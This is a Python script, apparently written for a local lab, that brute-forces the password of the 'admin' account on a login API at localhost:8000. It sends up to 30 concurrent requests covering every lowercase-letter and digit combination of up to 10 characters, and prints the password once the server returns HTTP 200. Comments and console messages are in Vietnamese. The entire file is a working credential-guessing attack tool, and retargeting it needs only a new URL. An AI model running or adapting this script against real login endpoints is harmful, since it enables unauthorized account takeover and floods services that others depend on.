import asyncio
import aiohttp
import time
import string
import itertools

API_URL = "http://localhost:8000/login"
USERNAME = "admin"
CONCURRENCY_LIMIT = 30  
BATCH_SIZE = 100        

found_password = None
error_count = 0
start_time = 0

MAX_LENGTH = 10


# Chữ cái in thường và số (36 ký tự)
CHARSET = string.ascii_lowercase + string.digits 
def generate_passwords():
    for length in range(1, MAX_LENGTH + 1):
        for combo in itertools.product(CHARSET, repeat=length):
            yield "".join(combo)

def chunk_generator(iterable, size):
    iterator = iter(iterable)
    while True:
        chunk = list(itertools.islice(iterator, size))
        if not chunk:
            break
        yield chunk

async def attempt_login(session, semaphore, password_attempt):
    global found_password, error_count
    
    if found_password:
        return
    # LOG CHI TIẾT TỪNG MẬT KHẨU
    print(f"[*] Đang thử: {password_attempt}")

    payload = {"username": USERNAME, "password": password_attempt}

    try:
        async with semaphore:
            async with session.post(API_URL, json=payload, timeout=5) as response:
                if response.status == 200:
                    found_password = password_attempt
                    time_elapsed = round(time.time() - start_time, 2)
                    
                    try:
                        resp_text = await response.text()
                    except:
                        resp_text = "Không thể đọc nội dung"

                    # IN LOG CHI TIẾT KHI TÌM THẤY
                    print("\n" + "🔥"*25)
                    print(f"[+]! ĐÃ TÌM THẤY MẬT KHẨU!")
                    print(f"     Username  : {USERNAME}")
                    print(f"     Password  : {password_attempt}")
                    print(f"     Thời gian : Mất {time_elapsed} giây")
                    print(f"     HTTP Code : {response.status}")
                    print(f"     Response: {resp_text[:200]}") 
                    print("🔥"*25 + "\n")
                    
    except Exception as e:
        error_count += 1
        if error_count <= 3:
            print(f"[-] Lỗi kết nối khi thử '{password_attempt}': {e}")

async def main():
    global start_time
    print(f"Bắt đầu Brute Force vào {API_URL}...")
    print(f"Bộ ký tự : {CHARSET}")
    print(f"Cấu hình : Tối đa {MAX_LENGTH} ký tự | {CONCURRENCY_LIMIT} luồng \n")
    
    start_time = time.time()
    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    connector = aiohttp.TCPConnector(limit=CONCURRENCY_LIMIT)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        password_gen = generate_passwords()
        
        for batch in chunk_generator(password_gen, BATCH_SIZE):
            if found_password:
                break
                
            tasks = [attempt_login(session, semaphore, pw) for pw in batch]
            
            await asyncio.gather(*tasks)

    # Kết luận cuối cùng
    if not found_password:
        print(f"\n[-] Đã quét sạch đến {MAX_LENGTH} ký tự nhưng không trúng.")
        if error_count > 0:
            print(f"[-] Cảnh báo: Có {error_count} request bị lỗi kết nối.")
        print(f"[+] Tổng thời gian: {round(time.time() - start_time, 2)} giây")

if __name__ == "__main__":
    asyncio.run(main())